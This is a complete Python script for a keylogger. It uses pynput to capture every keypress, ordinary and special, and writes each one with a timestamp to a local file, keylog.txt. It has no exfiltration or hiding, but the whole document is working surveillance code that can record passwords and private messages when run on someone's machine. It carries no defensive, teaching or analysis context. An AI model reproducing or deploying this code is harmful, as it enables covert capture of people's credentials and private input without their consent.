from pynput.keyboard import Listener
import logging

logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format="%(asctime)s: %(message)s")

def on_press(key):
    try:
        logging.info(f"Key {key.char}")
    except AttributeError:
        logging.info(f"Special key {key}")
def start_keylogger():
    with Listener(on_press=on_press) as listener:
        listener.join()
        
if __name__ == "__main__":
    start_keylogger() 
